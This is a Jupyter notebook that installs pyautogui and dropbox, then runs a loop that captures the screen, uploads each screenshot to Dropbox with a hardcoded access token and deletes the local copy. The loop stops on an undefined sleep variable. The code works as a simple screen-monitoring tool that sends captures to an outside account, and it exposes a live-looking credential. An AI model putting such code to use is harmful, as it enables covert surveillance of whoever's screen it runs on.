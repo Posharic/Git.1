{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "a9d64350",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pyautogui\n",
      "  Downloading PyAutoGUI-0.9.54.tar.gz (61 kB)\n",
      "     ---------------------------------------- 0.0/61.2 kB ? eta -:--:--\n",
      "     ------ --------------------------------- 10.2/61.2 kB ? eta -:--:--\n",
      "     ------------------- ------------------ 30.7/61.2 kB 217.9 kB/s eta 0:00:01\n",
      "     -------------------------------------- 61.2/61.2 kB 324.8 kB/s eta 0:00:00\n",
      "  Installing build dependencies: started\n",
      "  Installing build dependencies: finished with status 'done'\n",
      "  Getting requirements to build wheel: started\n",
      "  Getting requirements to build wheel: finished with status 'done'\n",
      "  Preparing metadata (pyproject.toml): started\n",
      "  Preparing metadata (pyproject.toml): finished with status 'done'\n",
      "Collecting pymsgbox (from pyautogui)\n",
      "  Downloading PyMsgBox-1.0.9.tar.gz (18 kB)\n",
      "  Installing build dependencies: started\n",
      "  Installing build dependencies: finished with status 'done'\n",
      "  Getting requirements to build wheel: started\n",
      "  Getting requirements to build wheel: finished with status 'done'\n",
      "  Preparing metadata (pyproject.toml): started\n",
      "  Preparing metadata (pyproject.toml): finished with status 'done'\n",
      "Collecting pytweening>=1.0.4 (from pyautogui)\n",
      "  Downloading pytweening-1.0.7.tar.gz (168 kB)\n",
      "     ---------------------------------------- 0.0/168.2 kB ? eta -:--:--\n",
      "     -------------- ------------------------ 61.4/168.2 kB 1.7 MB/s eta 0:00:01\n",
      "     -------------------------------------- 168.2/168.2 kB 2.0 MB/s eta 0:00:00\n",
      "  Preparing metadata (setup.py): started\n",
      "  Preparing metadata (setup.py): finished with status 'done'\n",
      "Collecting pyscreeze>=0.1.21 (from pyautogui)\n",
      "  Downloading PyScreeze-0.1.30.tar.gz (27 kB)\n",
      "  Installing build dependencies: started\n",
      "  Installing build dependencies: finished with status 'done'\n",
      "  Getting requirements to build wheel: started\n",
      "  Getting requirements to build wheel: finished with status 'done'\n",
      "  Preparing metadata (pyproject.toml): started\n",
      "  Preparing metadata (pyproject.toml): finished with status 'done'\n",
      "Collecting pygetwindow>=0.0.5 (from pyautogui)\n",
      "  Downloading PyGetWindow-0.0.9.tar.gz (9.7 kB)\n",
      "  Preparing metadata (setup.py): started\n",
      "  Preparing metadata (setup.py): finished with status 'done'\n",
      "Collecting mouseinfo (from pyautogui)\n",
      "  Downloading MouseInfo-0.1.3.tar.gz (10 kB)\n",
      "  Preparing metadata (setup.py): started\n",
      "  Preparing metadata (setup.py): finished with status 'done'\n",
      "Collecting pyrect (from pygetwindow>=0.0.5->pyautogui)\n",
      "  Downloading PyRect-0.2.0.tar.gz (17 kB)\n",
      "  Preparing metadata (setup.py): started\n",
      "  Preparing metadata (setup.py): finished with status 'done'\n",
      "Requirement already satisfied: Pillow>=9.3.0 in f:\\anaconda\\lib\\site-packages (from pyscreeze>=0.1.21->pyautogui) (9.4.0)\n",
      "Collecting pyperclip (from mouseinfo->pyautogui)\n",
      "  Downloading pyperclip-1.8.2.tar.gz (20 kB)\n",
      "  Preparing metadata (setup.py): started\n",
      "  Preparing metadata (setup.py): finished with status 'done'\n",
      "Building wheels for collected packages: pyautogui, pygetwindow, pyscreeze, pytweening, mouseinfo, pymsgbox, pyperclip, pyrect\n",
      "  Building wheel for pyautogui (pyproject.toml): started\n",
      "  Building wheel for pyautogui (pyproject.toml): finished with status 'done'\n",
      "  Created wheel for pyautogui: filename=PyAutoGUI-0.9.54-py3-none-any.whl size=37597 sha256=59c4e98c8af7263bc9a27740f1dbbc01f635ddc90bf829b287f1e772b0814ca9\n",
      "  Stored in directory: c:\\users\\kiberone.kur13\\appdata\\local\\pip\\cache\\wheels\\95\\dc\\b1\\fe122b791e0db8bf439a0e6e1d2628e48f10bf430cae13521b\n",
      "  Building wheel for pygetwindow (setup.py): started\n",
      "  Building wheel for pygetwindow (setup.py): finished with status 'done'\n",
      "  Created wheel for pygetwindow: filename=PyGetWindow-0.0.9-py3-none-any.whl size=11079 sha256=24b0cdbad3f9cc3db005ed36596a6591a01ee1795de66f89ee1a373386f27482\n",
      "  Stored in directory: c:\\users\\kiberone.kur13\\appdata\\local\\pip\\cache\\wheels\\07\\75\\0b\\7ca0b598eb4c21d43ba4bcc78a0538dfcf803a5997da33bc19\n",
      "  Building wheel for pyscreeze (pyproject.toml): started\n",
      "  Building wheel for pyscreeze (pyproject.toml): finished with status 'done'\n",
      "  Created wheel for pyscreeze: filename=PyScreeze-0.1.30-py3-none-any.whl size=14400 sha256=d95fe6ced4f94ed3ec4eac3ad7b17fa86677615d8334f489bc306b613a45623e\n",
      "  Stored in directory: c:\\users\\kiberone.kur13\\appdata\\local\\pip\\cache\\wheels\\df\\bc\\15\\d685ca085ca4b11e46e54cc3da4e501a98856c7fea8f604500\n",
      "  Building wheel for pytweening (setup.py): started\n",
      "  Building wheel for pytweening (setup.py): finished with status 'done'\n",
      "  Created wheel for pytweening: filename=pytweening-1.0.7-py3-none-any.whl size=6214 sha256=014fb27c317648f7faeedeb490e5967afbefc9a859ecae72d5971aed29c52542\n",
      "  Stored in directory: c:\\users\\kiberone.kur13\\appdata\\local\\pip\\cache\\wheels\\b2\\9b\\02\\059beba389e7e31a635bd9e8d9b7299f4ec11caca1f237f56d\n",
      "  Building wheel for mouseinfo (setup.py): started\n",
      "  Building wheel for mouseinfo (setup.py): finished with status 'done'\n",
      "  Created wheel for mouseinfo: filename=MouseInfo-0.1.3-py3-none-any.whl size=10906 sha256=9853c30a268ae0ef234dbff11e6f21e3688d8817fb592aaa42a1c33fe75123e0\n",
      "  Stored in directory: c:\\users\\kiberone.kur13\\appdata\\local\\pip\\cache\\wheels\\20\\0b\\7f\\939ac9ff785b09951c706150537572c00123412f260a6024f3\n",
      "  Building wheel for pymsgbox (pyproject.toml): started\n",
      "  Building wheel for pymsgbox (pyproject.toml): finished with status 'done'\n",
      "  Created wheel for pymsgbox: filename=PyMsgBox-1.0.9-py3-none-any.whl size=7416 sha256=42221d7d271eb0818a427c9ab3329066fe7e3cc2f0e4fdd8cf95d6d73dd97272\n",
      "  Stored in directory: c:\\users\\kiberone.kur13\\appdata\\local\\pip\\cache\\wheels\\85\\92\\63\\e126ee5f33d8f2ed04f96e43ef5df7270a2f331848752e8662\n",
      "  Building wheel for pyperclip (setup.py): started\n",
      "  Building wheel for pyperclip (setup.py): finished with status 'done'\n",
      "  Created wheel for pyperclip: filename=pyperclip-1.8.2-py3-none-any.whl size=11137 sha256=b4dcf56e19df7f5cd0a60687f93cee113c11dab1920c629639a5c6b4b8622ed2\n",
      "  Stored in directory: c:\\users\\kiberone.kur13\\appdata\\local\\pip\\cache\\wheels\\70\\bd\\ba\\8ae5c080c895c9360fe6e153acda2dee82527374467eae061b\n",
      "  Building wheel for pyrect (setup.py): started\n",
      "  Building wheel for pyrect (setup.py): finished with status 'done'\n",
      "  Created wheel for pyrect: filename=PyRect-0.2.0-py2.py3-none-any.whl size=11205 sha256=c9f4434d9b8b6b7cbfa05d6d8ec3b45d5141deb805246b97285605aa7bcbff0f\n",
      "  Stored in directory: c:\\users\\kiberone.kur13\\appdata\\local\\pip\\cache\\wheels\\c4\\e9\\fc\\b7a666dd4f9a3168fb44d643079b41d36ddab52f470707e820\n",
      "Successfully built pyautogui pygetwindow pyscreeze pytweening mouseinfo pymsgbox pyperclip pyrect\n",
      "Installing collected packages: pytweening, pyrect, pyperclip, pymsgbox, pyscreeze, pygetwindow, mouseinfo, pyautogui\n",
      "Successfully installed mouseinfo-0.1.3 pyautogui-0.9.54 pygetwindow-0.0.9 pymsgbox-1.0.9 pyperclip-1.8.2 pyrect-0.2.0 pyscreeze-0.1.30 pytweening-1.0.7\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pyautogui"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "8f153f45",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting dropbox\n",
      "  Obtaining dependency information for dropbox from https://files.pythonhosted.org/packages/86/96/1cd39be567d8e361fc06a4135e40ddbf1410f99524771a7f3e5807a26a35/dropbox-11.36.2-py3-none-any.whl.metadata\n",
      "  Downloading dropbox-11.36.2-py3-none-any.whl.metadata (4.3 kB)\n",
      "Requirement already satisfied: requests>=2.16.2 in f:\\anaconda\\lib\\site-packages (from dropbox) (2.31.0)\n",
      "Requirement already satisfied: six>=1.12.0 in f:\\anaconda\\lib\\site-packages (from dropbox) (1.16.0)\n",
      "Collecting stone>=2 (from dropbox)\n",
      "  Downloading stone-3.3.1-py3-none-any.whl (162 kB)\n",
      "     ---------------------------------------- 0.0/162.3 kB ? eta -:--:--\n",
      "     ---------------------------------------- 0.0/162.3 kB ? eta -:--:--\n",
      "     -- ------------------------------------- 10.2/162.3 kB ? eta -:--:--\n",
      "     ------- ----------------------------- 30.7/162.3 kB 330.3 kB/s eta 0:00:01\n",
      "     -------------- ---------------------- 61.4/162.3 kB 409.6 kB/s eta 0:00:01\n",
      "     --------------------------- -------- 122.9/162.3 kB 654.9 kB/s eta 0:00:01\n",
      "     ------------------------------------ 162.3/162.3 kB 748.9 kB/s eta 0:00:00\n",
      "Requirement already satisfied: charset-normalizer<4,>=2 in f:\\anaconda\\lib\\site-packages (from requests>=2.16.2->dropbox) (2.0.4)\n",
      "Requirement already satisfied: idna<4,>=2.5 in f:\\anaconda\\lib\\site-packages (from requests>=2.16.2->dropbox) (3.4)\n",
      "Requirement already satisfied: urllib3<3,>=1.21.1 in f:\\anaconda\\lib\\site-packages (from requests>=2.16.2->dropbox) (1.26.16)\n",
      "Requirement already satisfied: certifi>=2017.4.17 in f:\\anaconda\\lib\\site-packages (from requests>=2.16.2->dropbox) (2023.7.22)\n",
      "Requirement already satisfied: ply>=3.4 in f:\\anaconda\\lib\\site-packages (from stone>=2->dropbox) (3.11)\n",
      "Downloading dropbox-11.36.2-py3-none-any.whl (594 kB)\n",
      "   ---------------------------------------- 0.0/594.0 kB ? eta -:--:--\n",
      "   -------- ------------------------------- 122.9/594.0 kB 7.5 MB/s eta 0:00:01\n",
      "   --------------- ------------------------ 235.5/594.0 kB 2.9 MB/s eta 0:00:01\n",
      "   --------------- ------------------------ 235.5/594.0 kB 2.9 MB/s eta 0:00:01\n",
      "   ------------------------ --------------- 368.6/594.0 kB 2.6 MB/s eta 0:00:01\n",
      "   ---------------------------------------  593.9/594.0 kB 2.7 MB/s eta 0:00:01\n",
      "   ---------------------------------------- 594.0/594.0 kB 2.7 MB/s eta 0:00:00\n",
      "Installing collected packages: stone, dropbox\n",
      "Successfully installed dropbox-11.36.2 stone-3.3.1\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install dropbox"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "id": "4491598f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Файл загружен\n",
      "Файл загружен\n"
     ]
    },
    {
     "ename": "NameError",
     "evalue": "name 'S' is not defined",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mNameError\u001b[0m                                 Traceback (most recent call last)",
      "Cell \u001b[1;32mIn[33], line 36\u001b[0m\n\u001b[0;32m     33\u001b[0m upload_to_dropbox(screenshot_file)\n\u001b[0;32m     35\u001b[0m os\u001b[38;5;241m.\u001b[39mremove(screenshot_file)\n\u001b[1;32m---> 36\u001b[0m time\u001b[38;5;241m.\u001b[39msleep(S)\n",
      "\u001b[1;31mNameError\u001b[0m: name 'S' is not defined"
     ]
    }
   ],
   "source": [
    "import pyautogui \n",
    "import datetime\n",
    "import dropbox\n",
    "import os\n",
    "import time\n",
    "\n",
    "ACCESS_TOKEN = \"sl.BvZ2Hi57ELay1WOSRQgnMv7WKTpEcdhZiEqpQp7ITDR9qAtgJSvCOuKWx96cxpfb9KzGiRdNWejrOFo8qzKlAo-QqhuUpq0bM9vT3te895g4O39RB-m_ggeCDPUdkFUQmzJ9Ke0SKlEcsu09QyEQ\"\n",
    "\n",
    "def take_screenshot():\n",
    "    now = datetime.datetime.now()\n",
    "    timestamp = now.strftime(\"%Y-%m-%d_%H_%M-%S\")\n",
    "    screenshot_files = f\"screenshot_{timestamp}.png\"\n",
    "    screenshot = pyautogui.screenshot()\n",
    "    screenshot.save(screenshot_files)\n",
    "    return screenshot_files\n",
    "\n",
    "\n",
    "def upload_to_dropbox(file_path):\n",
    "    dbx = dropbox.Dropbox(ACCESS_TOKEN)\n",
    "    \n",
    "    with open(file_path, 'rb') as f:\n",
    "        dbx.files_upload(f.read(), f\"/{file_path}\")\n",
    "    print(\"Файл загружен\")\n",
    "    \n",
    "screenshot_file = take_screenshot()\n",
    "    \n",
    "upload_to_dropbox(screenshot_file)\n",
    "\n",
    "while(True):\n",
    "\n",
    "    screenshot_file = take_screenshot()\n",
    "    \n",
    "    upload_to_dropbox(screenshot_file)\n",
    "    \n",
    "    os.remove(screenshot_file)\n",
    "    time.sleep(S)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "96795cfe",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "701c2f59",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
